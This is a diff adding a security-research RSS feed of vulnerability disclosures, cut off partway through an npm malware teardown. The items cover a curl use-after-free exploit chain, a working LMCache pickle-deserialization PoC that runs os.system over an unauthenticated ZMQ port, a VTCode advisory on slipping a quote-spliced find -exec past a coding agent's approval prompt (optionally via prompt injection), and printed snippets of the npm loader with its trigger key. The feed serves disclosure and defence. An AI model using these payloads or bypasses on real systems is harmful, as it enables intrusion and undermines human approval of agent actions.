@@ -1,0 +1,1379 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>JFrog Security Research</title>
+        <link>https://research.jfrog.com</link>
+        <description>Homepage feed: latest vulnerabilities and security research posts from JFrog Security Research.</description>
+        <lastBuildDate>Sun, 18 Oct 2026 00:39:30 GMT</lastBuildDate>
+        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
+        <generator>Gridsome Home RSS</generator>
+        <language>en</language>
+        <atom:link href="https://research.jfrog.com/rss.xml" rel="self" type="application/rss+xml"/>
+        <item>
+            <title><![CDATA[CVE-2026-92392: curl HTTP/2 upload RCE]]></title>
+            <link>https://research.jfrog.com/post/curl-http2-upload-rce-cve-2026-92392/</link>
+            <guid>https://research.jfrog.com/post/curl-http2-upload-rce-cve-2026-92392/</guid>
+            <pubDate>Thu, 15 Oct 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[JFrog Security Research is tracking CVE-2026-92392, a HIGH-severity curl/libcurl use-after-free in HTTP/2 uploads that a malicious HTTPS server can turn into client-side remote code execution. We break down the bug, the published exploit, and the narrow conditions it needs.]]></description>
+            <content:encoded><![CDATA[
+<p align="center"><img src="/img/RealTimePostImage/post/curl-http2-upload-rce/image1.png" alt="" /></p>
+
+
+Recently, JFrog Security has been tracking a HIGH-severity curl (CVE-2026-92392), that was disclosed as part of a new release where at least 24 vulnerabilities were [patched](https://ubuntu.com/blog/curl-vulnerabilities-fixes-available). This has garnered a lot of attention due to its ability to cause Remote Code Execution.  
+In this write-up, we will discuss the bug itself, the exploit itself, its mechanics, and the very specific prerequisites required for it to be anything else but a Denial of Service attack.  
+The bug Description Is as follows: “Client-side remote code execution via a malicious HTTPS server.”
+
+### **Who is affected by CVE-2026-92392:**
+
+* curl 8.12.0 to 8.22.0  
+* (libcurl and the curl tool) Introduced by commit [cd9107e0](https://github.com/curl/curl/commit/cd9107e0) (8.12.0)  
+* Fixed curl 8.23.0 (commits [8b0744af](https://github.com/curl/curl/commit/8b0744af), [d9295430](https://github.com/curl/curl/commit/d9295430), [11d0b202](https://github.com/curl/curl/commit/11d0b202), [146698ea](https://github.com/curl/curl/commit/146698ea))  
+* A Curl Configuration that runs “curl -Z -T file https://attacker/x https://attacker/y”  
+* Attacker position controls the HTTPS server (valid certificate, no -k needed)
+
+## **Remediation**
+
+* **Upgrade to curl 8.23.0.** It ships the fix. This is the only complete fix.  
+* **Workaround if you cannot upgrade:** force --http1.1 for uploads, or do not upload to untrusted servers.  
+* **JFrog Xray users are protected:** Xray flags curl and libcurl 8.12.0 to 8.22.0 in scanned artifacts and dependencies.
+
+## **Reproducing CVE-2026-92392**
+
+### **The bug**
+
+The main fix  
+<p align="center"><img src="/img/RealTimePostImage/post/curl-http2-upload-rce/image2.png" alt="" /></p>
+
+### **Background: HTTP/2 uploads in curl**
+
+When curl uploads over HTTP/2, the request body is streamed as DATA frames. If the server’s flow-control window closes mid-upload, curl parks the unsent body bytes in the [easy handle](https://everything.curl.dev/transfers/easyhandle.html)’s request structure and waits for a WINDOW_UPDATE. The stream stays open in nghttp2, with **stream_user_data** pointing at the Curl_easy handle.  
+If the server resets such a stream with RST_STREAM(REFUSED_STREAM) or RST_STREAM(HTTP_1_1_REQUIRED), curl marks the transfer for retry and runs **multi_done()** to clean up the attempt.
+
+### **What goes wrong in multi_done()**
+
+**multi_done()** ran its cleanup steps in the wrong order for this case:
+
+* **Curl_conn_ev_data_done()** runs first. It calls **req_flush()**, which tries to push the parked, unsent body bytes out before the connection event is considered done.  
+* Flushing body bytes on a reset stream makes **h2_submit()** call **nghttp2_submit_request()** again. This registers a new stream (the “phantom stream”) in nghttp2, with **stream_user_data** = **data**, the same Curl_easy [easy handle](https://everything.curl.dev/transfers/easyhandle.html) that is being torn down.  
+* **Curl_req_done()** and the rest of the cleanup then finish, and the Curl_easy [easy handle](https://everything.curl.dev/transfers/easyhandle.html) is freed.
+
+nghttp2 now holds a stream whose user data points to a freed heap. The next frame event on that stream (for example, at connection teardown, through **cf_h2_shutdown()** -> **on_begin_headers()** / **on_stream_frame()**) reads **data->mid** through the dangling pointer.  
+<p align="center"><img src="/img/RealTimePostImage/post/curl-http2-upload-rce/image3.png" alt="" /></p>  
+
+The ASAN trace confirms the read: **on_stream_frame()** (lib/http2.c:949) dereferences the freed easy during connection pool destroy.  
+**In one sentence**: the transfer’s request object is retired **after** the connection filters are told the transfer is done, and the filter-side flush that runs in between can still push parked upload bytes onto the connection, which re-registers the stream with the easy handle that is being torn down.
+
+### **The fix**
+
+Upstream fixed this on two levels:
+
+* [**8b0744af**](https://github.com/curl/curl/commit/8b0744af): **multi_done()** reorder (the diff shown above). **Curl_req_done()** now runs before the connection event handler, so no request-body flush can happen while the connection is being told the data is done. The phantom stream is never submitted.  
+* [**d9295430**](https://github.com/curl/curl/commit/d9295430): defense in depth. nghttp2’s **stream_user_data** no longer holds a raw **Curl_easy\***. It holds an **h2_stream_ctx\***, and the easy handle is resolved through a lookup in the multi’s stream table. A stale stream ID resolves to nothing instead of dereferencing freed memory.
+
+## **Exploiting CVE-2026-92392**
+
+### **The attack scenario**
+
+The reporter’s exploit turns the UAF read into **system(cmd)** on the client. Victim: stock curl 8.22.0 release build (PIE, ASLR on), no -k, no debug flags.  
+The Following is the RCE Scenario:  
+<p align="center"><img src="/img/RealTimePostImage/post/curl-http2-upload-rce/image4.png" alt="" /></p>
+
+### **The exploit**
+
+TL;DR: A malicious server makes curl free memory it’s still using, plants its own data there, and hijacks it to run a command. In practice it’s a long shot: the app must use curl to fetch from one site and upload to another in parallel, with both sites attacker-controlled.
+
+#### **Step 1: connection topology**
+
+The victim runs a parallel upload: the transfer under attack is the upload itself, and a second, never-ending download keeps a connection busy while the attack plays out. Internally, curl tracks every transfer in an easy handle: one control structure that owns the request state for that transfer from start to finish. The upload's easy handle, **E_A**, is the target of the attack. The server forces curl to retry by resetting streams, so the attack unfolds over three rounds, one connection each.
+
+* **Round 1:** The upload and the download arrive together, multiplexed on one connection. The server reads the whole upload body (its exact size matters later), then resets both streams with RST_STREAM(REFUSED_STREAM). curl, told the server refused the requests, retries both.  
+* **Round 2, the poisoned connection:** The download is answered slowly, forever: it keeps this connection alive and driving while the attack plays out. The retried upload is the aimed one. The server grants exactly j \* 16 KiB of flow-control window, lets that much body through, and stalls. With body bytes parked mid-send, it resets the stream. **multi_done()** then runs its cleanup in the wrong order and resurrects the parked request as a phantom stream, S', registered with E_A as its owner.
+
+* **Round 3:** The upload's final attempt is accepted in full and answered 200. The transfer completes, and curl frees E_A.
+
+<p align="center"><img src="/img/RealTimePostImage/post/curl-http2-upload-rce/image5.png" alt="" /></p>
+
+### **Step 2: heap grooming**
+
+The server needs to control what lands in **E_A**’s freed slot. curl gives the server two allocation primitives, both fully server-driven:
+
+* **TLS 1.3 NewSessionTicket:** OpenSSL stores the ticket with **OPENSSL_memdup(ticket, ticklen)**, a binary-safe, exact-size allocation. curl sets SSL_OP_NO_TICKET, but OpenSSL still processes (and memdups) unsolicited tickets. Each new ticket frees the previous buffer first, which makes this a controlled malloc/free pair of arbitrary content and size.  
+* **HPACK blocks on the closed stream:** nghttp2 inflates header blocks sent on a closed stream and then ignores them, but the allocations still happen. Literals with incremental indexing stay in the dynamic table (persistent); literals without indexing are freed right away (transient). Dynamic table size updates (0 then 4096) free everything at a chosen moment. This gives precise control over specific glibc size classes (0x50, 0x210).
+
+Timing matters as much as sizes. The server fills the kernel accept queue with dummy connections so that the round 3 attempt’s SYN is dropped and nothing allocates between **free(E_A)** and the refill. It also holds the poisoned connection’s (round 2) TLS handshake until round 1 is torn down, so the poisoned connection’s first 16 KiB pool chunk lands adjacent to **E_A**’s old 64 KiB upload buffer.  
+<p align="center"><img src="/img/RealTimePostImage/post/curl-http2-upload-rce/image6.png" alt="" /></p>
+
+### **Step 3: reclaim**
+
+The server sends a NewSessionTicket carrying a partial fake easy (magic 0xc0dedbad at \+0, the phantom stream’s id at \+4). OpenSSL frees the previous ticket buffer and memdups this one into **E_A**’s old slot. The slot is now occupied by attacker-controlled bytes, and S' still points at it.  
+**Controlled Reclaim Achieved.**
+
+### **Step 4: the leak (W1 over-read)**
+
+The exploit needs a libc base. It gets it with a heap over-read smuggled out inside curl’s own upload body:
+
+* HPACK eviction choreography frees a 0x50-class chunk so that it sits at the head of a poisoned bin.  
+* A :status 100 HEADERS on S' makes curl **calloc()** a 67-byte header store, which lands exactly below the target sendbuf bufq chunk T (the poisoned connection’s outgoing network buffer).  
+* A following header value (W1, sized for the 0x210 class) is placed by nghttp2’s rcbuf allocator so that it overflows into T’s header, writing controlled **r_offset** / **w_offset** values.  
+* **chunk_read()** (lib/bufq.c) hands out **data\[r_offset:w_offset\]** with no **dlen** check. The server opens the windows and curl uploads T’s memory far past its real end: 0x182f0 bytes starting 0x18300 below the buffer.  
+* The server scans the received bytes for glibc main_arena bin pointers (several candidates voting for one page-aligned base) to get the libc base. Fallback: &**Curl_nghttp2_free** appears in every rcbuf header, giving the libcurl base, and libc follows from the 2 MiB library load-order rule.
+
+**Information Disclosure complete.**
+
+### **Step 5: the trigger**
+
+One TLS flight carries two records:
+
+* a NewSessionTicket with the final fake easy (2832 bytes, sized to re-occupy the same slot in the same SSL_read burst)  
+* a WINDOW_UPDATE(0) on S', an invalid frame that makes nghttp2 call curl’s error path
+
+<p align="center"><img src="/img/RealTimePostImage/post/curl-http2-upload-rce/image7.png" alt="" /></p>  
+
+**And bang! We have Arbitrary Code Execution!**
+
+## **Conclusions**
+
+Due to the uncommon usage and attack scenario of `curl` outlined in the report, the report was rated high by the curl security team:  
+<p align="center"><img src="/img/RealTimePostImage/post/curl-http2-upload-rce/image8.png" alt="" /></p>  
+
+During our own investigation, we attempted to exploit the vulnerability under less restrictive conditions to evaluate whether its severity should be elevated from HIGH to CRITICAL. However, we were unable to achieve code execution outside the specific setup described. 
+
+To our knowledge, the published proof-of-concept represents the minimum requirements necessary to trigger Remote Code Execution. The exploit is technically very impressive and is at least a plausible usage of curl.
+
+But frankly, in its current state, exploitation of this bug is a “once-in-a-blue-moon scenario”.  
+Where an application uses curl to transfer data from one site, PUT it to another using parallelism, where both the source site and destination site arguments are attacker-controlled, this is quite a rare scenario.
+
+## **How Does JFrog protect you**
+
+Xray does not stop at the version match. Its contextual analysis decides whether the vulnerable conditions are actually present in the artifact, and only then reports the CVE as **Applicable**. For **CVE-2026-92392**, the scanner correlates three pieces of evidence:
+
+* The libcurl binary is compiled with nghttp2 (HTTP/2) support,  
+* The vulnerable function **curl_easy_setopt** is called,  
+* A script drives the curl tool with an upload flag (-T, -d, -F, --json, or their long forms).
+
+If HTTP/2 support is found but neither usage condition is, Xray returns **Undetermined** instead of a false positive, since exploitation is still possible through direct CLI use or dynamically loaded libcurl bindings. This lets teams prioritize the artifacts where the exploit path is real.
+
+HTTP/2 is negotiated by ALPN, so any HTTPS upload to an attacker’s server is enough. The single-URL case (curl -T file https://attacker/x) gives a crash. Parallel mode (-Z) gives full RCE.
+
+<p align="center"><img src="/img/RealTimePostImage/post/curl-http2-upload-rce/image9.jpg" alt="" /></p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/lmcache-is-vulnerable-to-unauthenticated-remote-code-execution-via-pickle-deserialization-on-the-multiprocess-zmq-transport-cve-2026-105192-jfsa-2026-001694382/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/lmcache-is-vulnerable-to-unauthenticated-remote-code-execution-via-pickle-deserialization-on-the-multiprocess-zmq-transport-cve-2026-105192-jfsa-2026-001694382/</guid>
+            <pubDate>Wed, 07 Oct 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-105192, CRITICAL, LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport
+
+
+## Component
+
+lmcache (github.com/LMCache/LMCache)
+
+## Affected versions
+
+>= 0.3.9
+
+## Description
+
+LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. The intended clients are sibling LMCache processes. There is no CURVE, ZAP, password, or message authentication on that socket. LMCache used only inside a vLLM process does not open this port. The transport binds to localhost unless the operator sets a routable address with `--host`, which is how multi-node deployments let peers connect. The 9.8 score is for that routable configuration. A stock single-host install that leaves the default bind is not reachable from other machines.
+
+Messages on the socket are msgpack. Extension code 1 is registered for `DeviceIPCWrapper` and is passed to `DeviceIPCWrapper.Deserialize` in `lmcache/v1/platform/base/ipc_wrapper.py`, which calls `pickle.loads`. That hook runs from `ext_hook` in `lmcache/v1/multiprocess/custom_types.py` while the server is still decoding `REGISTER_KV_CACHE` arguments, before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root.
+
+The decode path shipped in v0.3.9. It is still present in the latest PyPI release, v0.5.5, in the v0.5.6 release candidates through v0.5.6rc3, and on the dev branch as of 2026-10-07. No fixed version has been published.
+
+## PoC
+
+<br>
+
+**Step 1 - Start multiprocess mode bound to a routable address**
+
+<br>
+
+This is the documented multi-node setting. The ZMQ transport listens on port 5555.
+
+```
+python -m lmcache.v1.multiprocess.http_server \
+    --http-host 127.0.0.1 --http-port 8080 \
+    --host 0.0.0.0 --port 5555 \
+    --l1-size-gb 0.25 --eviction-policy LRU \
+    --hash-algorithm blake3 --instance-id mp-node-01
+```
+
+<br>
+
+**Step 2 - Build a REGISTER_KV_CACHE frame whose cache slot is a pickle**
+
+<br>
+
+Payload slot 1 is a msgpack extension with code 1. The server unpickles that body while it is still decoding arguments. The command writes `id` to `/tmp/zmq_pwn`.
+
+```
+import os
+import pickle
+import msgspec
+import zmq
+
+class EvilPayload:
+    def __init__(self, cmd):
+        self.cmd = cmd
+    def __reduce__(self):
+        return (os.system, (self.cmd,))
+
+evil_pickle = pickle.dumps(EvilPayload("id > /tmp/zmq_pwn 2>&1"))
+
+REGISTER_KV_CACHE = 1
+EXT_CODE = 1
+NUM_PAYLOADS = 7
+KVCACHE_INDEX = 1
+
+b_uid = msgspec.msgpack.encode(0)
+b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE)
+payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS
+payloads[0] = msgspec.msgpack.encode(0)
+payloads[KVCACHE_INDEX] = msgspec.msgpack.encode(
+    [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)]
+)
+frames = [b_uid, b_type, *payloads]
+```
+
+<br>
+
+**Step 3 - Send the frame**
+
+<br>
+
+```
+ctx = zmq.Context()
+s = ctx.socket(zmq.DEALER)
+s.connect("tcp://127.0.0.1:5555")
+s.send_multipart(frames)
+```
+
+<br>
+
+The pickle runs during argument decode. The server then logs a type error for `REGISTER_KV_CACHE` because the handler expected a `DeviceIPCWrapper` and received the return value of `os.system`. That error is after the command has already run.
+
+<br>
+
+**Step 4 - Confirm the command ran as the LMCache user**
+
+<br>
+
+```
+cat /tmp/zmq_pwn
+```
+
+<br>
+
+Expected output on an official image, where the process runs as root:
+
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## Vulnerability Mitigations
+
+No fixed release is available as of 2026-10-07. The latest PyPI release is v0.5.5, and v0.5.6rc3 and the dev branch still call `pickle.loads` from `DeviceIPCWrapper.Deserialize`.
+
+Stop passing network bytes to pickle. Replace the serializer behind msgpack extension code 1 with a safe format, and do not call `pickle.loads` on data that arrived from an unauthenticated peer. Authenticate the ZMQ transport, for example with CURVE or an HMAC over each message, and refuse to bind a routable address unless that authentication is configured.
+
+Until a release includes that change, do not set `--host` to a routable address. Keep the multiprocess port on localhost or on a trusted cluster network. Limiting the port with a firewall reduces who can reach it. Any host that can open a connection to the port can still run code as the LMCache user.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-105192
+https://github.com/LMCache/LMCache
+https://pypi.org/project/lmcache/
+https://github.com/LMCache/LMCache/blob/v0.5.5/lmcache/v1/platform/base/ipc_wrapper.py
+https://github.com/LMCache/LMCache/blob/v0.3.9/lmcache/v1/multiprocess/custom_types.py
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[VTCode is vulnerable to Arbitrary Command Execution via an ANSI-C Quote Bypass of the find Approval Check]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/vtcode-is-vulnerable-to-arbitrary-command-execution-via-an-ansi-c-quote-bypass-of-the-find-approval-check-cve-2026-104247-jfsa-2026-001694179/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/vtcode-is-vulnerable-to-arbitrary-command-execution-via-an-ansi-c-quote-bypass-of-the-find-approval-check-cve-2026-104247-jfsa-2026-001694179/</guid>
+            <pubDate>Mon, 05 Oct 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-104247, MEDIUM, VTCode is vulnerable to Arbitrary Command Execution via an ANSI-C Quote Bypass of the find Approval Check]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+VTCode is vulnerable to Arbitrary Command Execution via an ANSI-C Quote Bypass of the find Approval Check
+
+
+## Component
+
+vtcode (github.com/vinhnx/VTCode)
+
+## Affected versions
+
+< 0.171.5
+
+## Description
+
+VTCode learns a family of safe `find` commands after a person approves three ordinary finds under the same workspace subdirectory. Later commands that share that family key run with no further prompt. The check that keeps destructive options out of the family compares tokens exactly (`-exec`, `-delete`, and a short list of siblings) in `is_destructive_find_option` inside `src/agent/runloop/unified/tool_routing/shell_approval.rs`.
+
+An empty ANSI-C quote spliced into the flag (`-exe$''c`) does not match that list, so `learned_find_pattern` still treats the command as a safe find. Once the family has been learned, `prompt_tool_permission` auto-approves it and the shell runs it. The proven result is command execution as the user running VTCode, without a new approval prompt. Reaching that point takes a local session, those prior approvals, and something that can steer the agent, such as indirect prompt injection.
+
+## PoC
+
+<br>
+
+**Step 1 - Install a vulnerable VTCode and open a trusted workspace**
+
+<br>
+
+Use VTCode before 0.171.5 with the default approval prompts (HITL) enabled. The workspace needs a `src` directory.
+
+```
+cargo install vtcode --version 0.171.4
+```
+
+<br>
+
+**Step 2 - Approve three distinct safe finds**
+
+<br>
+
+Ask the agent to run each of these, and approve each prompt. They must share the same top-level directory:
+
+```
+find src -type f -name '*.rs'
+find src -type d
+find src -name foo
+```
+
+<br>
+
+**Step 3 - Confirm the family now auto-approves**
+
+<br>
+
+Ask for another ordinary find under `src`. VTCode should run it with no new prompt.
+
+```
+find src -type f
+```
+
+<br>
+
+**Step 4 - Send the spliced find**
+
+<br>
+
+```
+find src -maxdepth 0 -exe$''c touch /tmp/VT_BYPASS_POC {} +
+```
+
+<br>
+
+**Step 5 - Confirm the command ran without a prompt**
+
+<br>
+
+```
+ls -l /tmp/VT_BYPASS_POC
+```
+
+<br>
+
+Expected output:
+
+```
+-rw-r--r--  1 <user>  <group>  0 <date> /tmp/VT_BYPASS_POC
+```
+
+<br>
+
+On 0.171.5 or later, the same command does not inherit the safe-find family and still requires approval.
+
+## Vulnerability Mitigations
+
+Upgrade to VTCode 0.171.5 or later. The release marks every version below 0.171.5 as affected.
+
+An earlier change in 0.141.12 rejected this `$''` splice only on a bare `find`. The follow-up in 0.171.5 (https://github.com/vinhnx/VTCode/pull/778, commit 5840697cd0dc8f94b9b53d88185329eecba8de11) is the first release the advisory treats as patched. It also refuses family learning for path-qualified `find` (`./find`, `/usr/bin/find`), mixed-case or quote-spliced flags, wrapper and environment prefixes, and compound commands.
+
+Until you upgrade, do not rely on learned find approvals. Treat a workspace where an untrusted prompt can drive the agent as able to run shell commands after a few ordinary finds have been approved.
+
+## References
+https://github.com/vinhnx/VTCode/security/advisories/GHSA-r249-hpfx-x2w7
+https://github.com/vinhnx/VTCode/pull/778
+https://github.com/vinhnx/VTCode/commit/5840697cd0dc8f94b9b53d88185329eecba8de11
+https://github.com/vinhnx/VTCode/releases/tag/0.171.5
+https://www.cve.org/CVERecord?id=CVE-2026-104247
+https://github.com/vinhnx/VTCode
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Equation of Compromise: Anatomy of a Live npm Supply-Chain Campaign]]></title>
+            <link>https://research.jfrog.com/post/equation-of-compromise/</link>
+            <guid>https://research.jfrog.com/post/equation-of-compromise/</guid>
+            <pubDate>Mon, 21 Sep 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[JFrog Security Research uncovered a targeted npm campaign hidden in cloned math libraries. The backdoor activates only for a specific matrix, receives encrypted tasks through an Ethereum Sepolia smart contract and Slack, and uses a GitHub Actions worker farm to manufacture hundreds of thousands of downloads.]]></description>
+            <content:encoded><![CDATA[
+
+
+![](/img/RealTimePostImage/post/equation-of-compromise/image1.png)
+
+Over the past week, several vendors have reported on malicious npm packages that, taken one at a time, look like separate incidents. In this article, we present our research into the campaign behind all of them, starting with analysis of the latest encrypted loader detected by [SafeDep](https://safedep.io/mathmain-encrypted-loader/). Unlike most malware, this one doesn't run for everybody who installs it, and requires a very specific cryptographic operation to be performed, allowing us to assume it's a targeted operation, maybe an interview campaign. The payload decrypts only when the victim solves a linear system with one specific matrix, takes its orders from a smart contract on the Ethereum Sepolia testnet, keeps a second command channel open over Slack, and hides behind download counts manufactured by a farm of GitHub Actions workers.
+
+The teardown below covers recovering the trigger key, what the implant does once it runs, how the contract enrolls and tasks victims, the Slack agent, the download factory, and the entire campaign operating accounts behind it for the six months.
+
+**It started with a math library**
+
+mathsbase is a straight copy of the popular [mathjs](https://www.npmjs.com/package/mathjs) library: same code, same README, different name. What was off was the popularity of six million downloads two days after publication, and not a single package depending on it**.**
+
+![](/img/RealTimePostImage/post/equation-of-compromise/image2.png)
+
+api.npmjs.org · 4 weeks, 24 Aug – 20 Sep 2026
+
+The 1.0.1 tarball carries four files that do not exist anywhere in upstream mathjs:
+
+| File under lib/cjs/utils/ | Size | What it is |
+| :---- | :---- | :---- |
+| event.js | small | AES-256-GCM loader |
+| graph.js | 31 KB | base64 blob |
+| fraction.js | 12 KB | base64 blob |
+| bignumber/type.js | 1.5 MB | base64 blob |
+
+Three encrypted blobs and a loader, but no key. So we pulled it apart.
+
+## **Breaking it open**
+
+The loader in utils/event.js is simple: it takes a password, derives a key from it with a functionscrypt that turns a password of any length into a fixed 32-byte key,  then decrypts the payload from graph.js with AES-256-GCM, writes the plaintext to disk, and executes it with require.
+
+Each encrypted file is laid out as salt[16] | iv[12] | tag[16] | ciphertext: a 16-byte salt, a 12-byte IV, a 16-byte authentication tag, then the encrypted payload. All four sit in the file in the clear and are required as input for the AES-256-GCP decrypt routine. 
+
+What the file does not contain is the one input that has to be secret: the password the key is derived from. Salt, IV, and tag are the public parameters of the encryption; the password is the only thing the attacker did not ship. The only question is what feeds it.
+
+The loader function is called from the file utils/is.js, from a function that has no counterpart in upstream mathjs:
+
+```js
+function isGraph(x) {
+  const name = _event.validEvent("IapMCmvlemBnFaU+...", JSON.stringify(x));
+  const mod  = require(_event.event(path.join(__dirname, name), JSON.stringify(x)));
+  return x && mod.validGraph(JSON.stringify(x)) || false;
+  
+}
+```
+
+isGraph() is reached from lusolve(), the function that solves a system of linear equations, through two modified files. When a developer calls the exported math.lusolve(A, b), lusolve factors the matrix with math.lup(A), gets back L, U, p and q, and calls the internal _lusolve(), which solves the system and produces the answer exactly as upstream does. Only after that result exists does an injected line in lusolve.js call removeSolveValidation(L._data), a function added to solveValidation.js that does not exist upstream. Inside it, a second injected line calls isGraph() on the same array, which serializes it to a JSON string and hands that string to the loader as the password. **That array is the key.**
+
+The placement is deliberate. The hook runs after the mathematical work is finished, and the return value of removeSolveValidation is assigned to a variable that is never read again, so the malicious call cannot change the output. The developer's answer is always correct.
+
+```js
+password  = JSON.stringify(L._data)
+key       = scryptSync(password, salt, 32)
+plaintext = AES-256-GCM(key, iv, tag, ciphertext)
+```
+
+No key ships with the package. The victim's own numerical workload supplies it at runtime, in a line as unremarkable as const weights = math.lusolve(A, b). Any other matrix fails GCM authentication, the loader swallows the exception, and require() chokes on base64 inside a code path where errors are already routine.  The malware is filtering for the only people it wants: developers who call lusolve as a matter of course. Judging by that trigger and by the DeFi-flavoured lure packages, the intended audience is quantitative and DeFi developers, though we never recovered a payload to confirm it.
+
+So we had to guess the matrix. The search space is arbitrary arrays of doubles, but AES-GCM gives a free oracle: the authentication tag either verifies or it does not, with no false positives, at about 50 ms per candidate. We enumerated structured matrices (identities, small integer matrices, textbook examples) and let the tag decide. It was the **3×3 symmetric Pascal matrix**:
+
+```js
+A = [[1,1,1],[1,2,3],[1,3,6]]
+math.lup(A).L._data → [[1,0,0],[1,1,0],[1,0.5,1]]
+```
+
+That string decrypts the first blob to a filename, graph.js, and from there the whole package opened up.
+
+## **What was inside**
+
+graph.js is the orchestrator. It turns a one-off decryption into a persistent implant in four steps.
+
+**It uses the LICENSE file as a lock.** Before anything else, it reads the package's own LICENSE file and looks for a line that has no business being in a licence:
+
+```js
+if (license.includes("REDISTRIBUTION REQUIRES INCLUSION OF THIS LICENSE.")) {
+    process.exit(1);   // already infected — stop here
+// }
+// fs.appendFileSync(licensePath, "\nREDISTRIBUTION REQUIRES INCLUSION OF THIS LICENSE.");
+```
+
+It is an infection marker hidden in the one file nobody reads. Deleting the line is also how the malware later uninstalls itself.
+
+**Then it detaches.** It respawns itself as a background process (detached: true, stdio: "ignore", unref()), so the developer's script finishes and the implant keeps running.
+
+**After that it phones home.** It collects platform, hostname, CPU count, memory and uptime, formats them as a Markdown block titled *🖥️ System Report*, and posts it to a Slack channel and a Telegram chat. Both credentials sit in the file as plain base64. This is the only outbound traffic graph.js ever sends, and nothing ever comes back on either channel.
+
+**And finally, it gets an identity on the Ethereum blockchain.** The operator wants to send instructions to one infected machine that nobody else can read, and wants no server that can be seized. For that, they're using a smart contract on the Sepolia testnet. Reading a contract is free and anonymous; writing to one needs a funded wallet. So the implant generates an X25519 keypair, then fetches a wallet the operator set aside for it. The wallet's private key sits encrypted in the contract, and unwrapping it takes two secrets joined with a *: the trigger password, and the version string of the assert devDependency in the victim's own package.json.
+
+```js
+const walletPassword = triggerPassword + "*" + getNPwd();   // getNPwd() = pkg.devDependencies?.assert
+// const address    = await contractRead.getLastActiveCwAddress();
+// const encrypted  = await contractRead.getCwPrivatePublic(address);
+// const privateKey = await decryptAESGCM(encrypted, walletPassword);
+```
+
+bootstrapWallet then checks that the decrypted value looks like a private key and that the address it derives matches the one the contract named. Neither secret works alone, so the wallet only opens on a machine that installed the package and ran the trigger. A researcher holding the tarball cannot obtain a working identity.
+
+With a wallet in hand, the implant writes its public key into the contract as a check-in. The operator reads it, derives a shared secret, and from then on every task is encrypted for that one machine.
+
+The other two blobs are supporting cast. **bignumber/type.js**, the 1.5 MB one, is a bundled copy of **ethers.js v5.7.2**, shipped so the implant has a Web3 client without touching node_modules. **fraction.js** is the Slack agent, covered below. 
+
+## **Command and control on a testnet**
+
+The implant's primary command channel is not a server. It is a smart contract on the **Sepolia test network**, used as a dead drop. A C2 server has an IP address, a hosting provider, and an abuse desk; a contract has none of those, cannot be taken down once deployed, and on a testnet costs nothing to use. The implant reads it through ordinary public RPC endpoints, so the traffic looks like a developer's own Web3 work.
+
+### **Enrollment**
+
+The contract runs a small membership system. The operator adds the victim's wallet address to an allowlist and stores an encrypted private key for it on-chain; the implant unwraps that key as described above and only then announces itself by writing its public key into the contract. The compiler left the failure messages in the bytecode:
+
+```js
+"Not whitelisted"
+"No active whitelisted address"
+"Caller is not the owner"
+```
+
+That discipline has an accidental consequence: **the operators kept a public register of their own victims.** 
+
+The campaign ran on fourteen smart contracts, deployed by five operator wallets between 2026-03-05 and 2026-09-16: thirteen on Ethereum Sepolia and one on Base Sepolia. Eight contracts were actively used and had enrolled victims, the other six took no more than two hosts each and served as rehearsals. All fourteen are verified on-chain under one of three names, `WalletDataRegistry`, `WebDataRegistry` and `WalletHelloWorld`, and searching the explorer for those names returns every deployment regardless of who made it. The verified source reads as a single codebase developed over six months with one compiler, solc 0.8.20. Every deployment was edited and recompiled, leaving thirteen distinct source variants across fourteen contracts. The contracts were not replaced one at a time: in June, three of them ran in parallel under three different wallets, and packages published months apart point at the same deployment.
+
+![](/img/RealTimePostImage/post/equation-of-compromise/image3.png)
+
+eth-sepolia.blockscout.com · all 1,060 successful transactions to the contract, 18 Jun – 14 Sep 2026
+
+### **Tasking**
+
+The operator writes a payload into two storage slots on the contract (split purely for size); writing the second slot emits an event; the implant has been subscribed to that event since it started. It reads both halves, decrypts them with its own private key and joins them, then writes the result to t utils/subwatcher, marks it executable, and runs it. 
+
+![](/img/RealTimePostImage/post/equation-of-compromise/image4.png)
+
+payload downloading
+
+The fourteen contracts carried 1,080 taskings, preserved as 2,162 encrypted payloads. Each is sealed under a key shared by the operator and a single implant, and none can be decrypted.
+
+Payloads were built once and sent to many hosts. The first production contract delivered a single 14.5 KB payload 64 times in five days. A payload of about 19.6 KB appears on three contracts between March and August, roughly 250 times in all — consistent with one second stage kept in service for five months.
+
+On deployment day of the June contract, 21 test payloads growing from 2.7 KB to 18 KB, alongside 23 out-of-gas failures, mark the operator probing the transaction size limit. Full 20–28 KB second stages followed until August. From 31 August the contract carried only a uniform 919-byte payload.
+
